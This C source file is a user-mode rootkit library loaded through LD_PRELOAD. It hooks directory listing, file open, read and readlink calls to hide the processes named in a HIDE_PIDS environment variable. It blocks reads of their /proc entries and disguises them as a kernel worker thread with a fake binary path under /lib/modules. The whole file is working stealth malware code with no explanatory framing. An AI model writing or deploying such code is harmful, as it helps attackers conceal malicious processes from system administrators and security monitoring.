#define _GNU_SOURCE
#include <dirent.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdarg.h>
#include <errno.h>

/* Original function pointers */
static struct dirent* (*original_readdir)(DIR *dirp) = NULL;
static struct dirent64* (*original_readdir64)(DIR *dirp) = NULL;
static int (*original_open)(const char *path, int flags, ...) = NULL;
static int (*original_openat)(int dirfd, const char *path, int flags, ...) = NULL;
static ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;
static ssize_t (*original_readlink)(const char *pathname, char *buf, size_t bufsiz) = NULL;

/* Hidden PIDs list */
static int hidden_pids[256] = {0};
static int hidden_pids_count = 0;
static pid_t my_pid = -1;

/* Initialize */
static void init_hooks(void) {
	if (!original_readdir) {
		original_readdir = dlsym(RTLD_NEXT, "readdir");
		original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
		original_open = dlsym(RTLD_NEXT, "open");
		original_openat = dlsym(RTLD_NEXT, "openat");
		original_read = dlsym(RTLD_NEXT, "read");
		original_readlink = dlsym(RTLD_NEXT, "readlink");
		my_pid = getpid();
	}
}

static int is_hidden(pid_t pid) {
	for (int i = 0; i < hidden_pids_count; i++) {
		if (hidden_pids[i] == pid) {
			return 1;
		}
	}
	return 0;
}

static pid_t parse_pid(const char *name) {
	char *endptr;
	long pid = strtol(name, &endptr, 10);

	if (*endptr == '\0' && pid > 0) {
		return (pid_t)pid;
	}
	return -1;
}

/* Extract PID from /proc path */
static pid_t extract_pid_from_proc_path(const char *path) {
	if (!path || strncmp(path, "/proc/", 6) != 0) {
		return -1;
	}

	const char *pidstr = path + 6;
	char *slash = strchr(pidstr, '/');

	if (slash) {
		/* /proc/1234/comm or similar */
		int len = slash - pidstr;
		char pidbuf[32];
		strncpy(pidbuf, pidstr, len);
		pidbuf[len] = '\0';
		return parse_pid(pidbuf);
	} else {
		/* /proc/1234 */
		return parse_pid(pidstr);
	}
}

/* ============================================================
 * Hook readdir to filter hidden processes
 * ============================================================ */
struct dirent* readdir(DIR *dirp) {
	init_hooks();

	struct dirent *entry;
	while ((entry = original_readdir(dirp)) != NULL) {
		pid_t pid = parse_pid(entry->d_name);

		if (pid > 0 && is_hidden(pid)) {
			continue;  /* Skip hidden PID */
		}

		return entry;
	}

	return NULL;
}

struct dirent64* readdir64(DIR *dirp) {
	init_hooks();

	struct dirent64 *entry;
	while ((entry = original_readdir64(dirp)) != NULL) {
		pid_t pid = parse_pid(entry->d_name);

		if (pid > 0 && is_hidden(pid)) {
			continue;  /* Skip hidden PID */
		}

		return entry;
	}

	return NULL;
}

/* ============================================================
 * Hook open/openat to intercept /proc metadata reads
 * ============================================================ */
int open(const char *path, int flags, ...) {
	init_hooks();

	va_list args;
	va_start(args, flags);
	mode_t mode = va_arg(args, mode_t);
	va_end(args);

	pid_t target_pid = extract_pid_from_proc_path(path);

	if (target_pid > 0 && is_hidden(target_pid)) {
		/* Try to open /proc/[pid]/comm, /proc/[pid]/stat, etc for hidden process */
		if (strstr(path, "/comm") || strstr(path, "/cmdline") ||
		    strstr(path, "/stat") || strstr(path, "/exe")) {
			/* Block the read */
			errno = ENOENT;  /* No such file or directory */
			return -1;
		}
	}

	return original_open(path, flags, mode);
}

int openat(int dirfd, const char *path, int flags, ...) {
	init_hooks();

	va_list args;
	va_start(args, flags);
	mode_t mode = va_arg(args, mode_t);
	va_end(args);

	pid_t target_pid = extract_pid_from_proc_path(path);

	if (target_pid > 0 && is_hidden(target_pid)) {
		if (strstr(path, "/comm") || strstr(path, "/cmdline") ||
		    strstr(path, "/stat") || strstr(path, "/exe")) {
			errno = ENOENT;
			return -1;
		}
	}

	return original_openat(dirfd, path, flags, mode);
}

/* ============================================================
 * Hook readlink to fake /proc/[pid]/exe
 * ============================================================ */
ssize_t readlink(const char *pathname, char *buf, size_t bufsiz) {
	init_hooks();

	pid_t target_pid = extract_pid_from_proc_path(pathname);

	if (target_pid > 0 && is_hidden(target_pid) && strstr(pathname, "/exe")) {
		/* Fake the binary path */
		const char *fake_path = "/lib/modules/kernel/core.o";
		size_t len = strlen(fake_path);
		size_t to_copy = len < bufsiz ? len : bufsiz;

		memcpy(buf, fake_path, to_copy);
		return to_copy;
	}

	return original_readlink(pathname, buf, bufsiz);
}

/* ============================================================
 * Hook read to fake /proc metadata
 * ============================================================ */
ssize_t read(int fd, void *buf, size_t count) {
	init_hooks();

	/* Get file path from fd (use /proc/self/fd) */
	char fd_path[256];
	char proc_path[512];
	snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);

	ssize_t ret = original_readlink(fd_path, proc_path, sizeof(proc_path) - 1);
	if (ret <= 0) {
		return original_read(fd, buf, count);
	}
	proc_path[ret] = '\0';

	pid_t target_pid = extract_pid_from_proc_path(proc_path);

	/* If reading from /proc/[hidden_pid]/comm */
	if (target_pid > 0 && is_hidden(target_pid) && strstr(proc_path, "/comm")) {
		const char *fake_comm = "[kworker/0:0]\n";
		size_t len = strlen(fake_comm);
		size_t to_copy = len < count ? len : count;

		memcpy(buf, fake_comm, to_copy);
		return to_copy;
	}

	/* If reading from /proc/[hidden_pid]/cmdline */
	if (target_pid > 0 && is_hidden(target_pid) && strstr(proc_path, "/cmdline")) {
		const char *fake_cmdline = "[kworker/0:0]";
		size_t len = strlen(fake_cmdline) + 1;
		size_t to_copy = len < count ? len : count;

		memcpy(buf, fake_cmdline, to_copy);
		return to_copy;
	}

	return original_read(fd, buf, count);
}

/* ============================================================
 * Parse HIDE_PIDS environment variable
 * ============================================================ */
void __attribute__((constructor)) init_hidden_pids(void) {
	const char *hidden_env = getenv("HIDE_PIDS");
	if (!hidden_env) {
		return;
	}

	char *env_copy = strdup(hidden_env);
	if (!env_copy) {
		return;
	}

	char *token = strtok(env_copy, " ");
	while (token && hidden_pids_count < 256) {
		pid_t pid = (pid_t)atoi(token);
		if (pid > 0) {
			hidden_pids[hidden_pids_count++] = pid;
		}
		token = strtok(NULL, " ");
	}

	free(env_copy);
}
